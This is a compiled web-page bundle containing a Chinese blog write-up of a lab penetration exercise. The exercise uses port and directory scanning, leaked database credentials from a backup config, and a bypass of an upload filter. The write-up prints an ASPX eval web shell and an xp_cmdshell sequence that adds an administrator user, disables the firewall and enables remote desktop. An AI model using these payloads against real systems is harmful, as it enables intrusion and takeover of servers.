import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as t,c as a,e as s}from"./app-2939163e.js";const i="/assets/e817c175e306e954c30fb0cd507951df-c87ce4b9.png",p="/assets/image-20230828092005268-0c93d5dc.png",n="/assets/image-20230828093314693-950fae49.png",c="/assets/image-20230828093613079-4aa4a419.png",d="/assets/image-20230828093755683-48e65b30.png",o="/assets/image-20230828094443296-12625fd5.png",r="/assets/image-20230828094634512-8dba47d2.png",l="/assets/image-20230828095420103-ef0d68dd.png",m="/assets/image-20230828095502044-4a1c3c2c.png",g="/assets/image-20230828095551234-b3ffe22d.png",v="data:image/png;base64,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",u="/assets/image-20230828110400223-be4bba19.png",b="/assets/image-20230828110635675-f42bb4dd.png",h={},f=s('<h1 id="找到登录页面" tabindex="-1"><a class="header-anchor" href="#找到登录页面" aria-hidden="true">#</a> 找到登录页面</h1><blockquote><p>首先得到一个目标IP，但发现并不能直接访问，于是用nmap或者御剑进行端口扫描</p><p>扫出的结果</p><p><img src="'+i+'" alt="e817c175e306e954c30fb0cd507951df"></p><p>逐个查看后，发现27689端口下是一个登录页面</p><p><img src="'+p+'" alt="image-20230828092005268"></p><p>弱口令尝试过后无结果</p><p>尝试万能密码后也无果</p><p>尝试扫描该端口的目录，使用dirsearch或者御剑扫描后台</p><p>扫出后台为web.config.bak</p><p><img src="'+n+'" alt="image-20230828093314693"></p><p>可以看到一个数据库名，和密码</p></blockquote><h1 id="进入登录页面进行文件上传" tabindex="-1"><a class="header-anchor" href="#进入登录页面进行文件上传" aria-hidden="true">#</a> 进入登录页面进行文件上传</h1><blockquote><p>用navicat连接后可找到用户名为<strong>admin</strong>和密码为<strong>asdadwn_d2112</strong></p><p>再反回登录，发现可以登录进去</p><p><img src="'+c+'" alt="image-20230828093613079"></p><p>点击文件上传与管理上传文件发现提示</p><p><img src="'+d+'" alt="image-20230828093755683"></p><p>再观察出上传的文件只能是.jpg，然后前面会生成一个固定长度的数字</p><p>于是想到拼接出32位为.aspx 33位后为.jpg</p><p><img src="'+o+'" alt="image-20230828094443296"></p><p>但点击后发现是下载文件，并没有解析文件</p><p>再上传后抓包，使用00截断发现页面报错</p><p><img src="'+r+`" alt="image-20230828094634512"></p><p>发现路径后，构造aspx木马</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;
&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>至.aspx的文件中</p><p>上传进去，根据报错信息，构造路径，用蚁剑连接</p><p><img src="`+l+'" alt="image-20230828095420103"></p><p><img src="'+m+'" alt="image-20230828095502044"></p><p>连接成功，进入</p><p><img src="'+g+'" alt="image-20230828095551234"></p><p>发现了key</p><p>然后又发现了第二个数据库</p></blockquote><h1 id="连接目标主机" tabindex="-1"><a class="header-anchor" href="#连接目标主机" aria-hidden="true">#</a> 连接目标主机</h1><blockquote><p>用navicat再次连接第二个数据库</p><p><img src="'+v+'" alt="image-20230828110314457"></p><p><img src="'+u+`" alt="image-20230828110400223"></p><p>执行以下命令</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>USE master
RECONFIGURE
EXEC sp_configure &#39;show advanced options&#39;,1
RECONFIGURE
EXEC sp_configure &#39;xp_cmdshell&#39;,1
exec master..xp_cmdshell &#39;net user admin 123 /add&#39;					————新建用户
exec master..xp_cmdshell &#39;net localgroup administrators admin /add&#39;	————添加用户至管理员组
exec master..xp_cmdshell &#39;netsh firewall set opmode disable&#39;		————关闭防火墙
exec master..xp_cmdshell &#39;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f&#39;							 ————打开一些服务
exec master..xp_cmdshell &#39;netstat -anop tcp | find &quot;3389&quot;&#39;			————打开3389端口（远程连接）
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>接下来就用远程桌面连接，连接目标电脑</p><p><img src="`+b+'" alt="image-20230828110635675"></p><p><strong>完结</strong></p></blockquote>',6),E=[f];function _(A,x){return t(),a("div",null,E)}const q=e(h,[["render",_],["__file","记一次登陆页面绕过及文件上传的靶场（2023-8-27）.html.vue"]]);export{q as default};
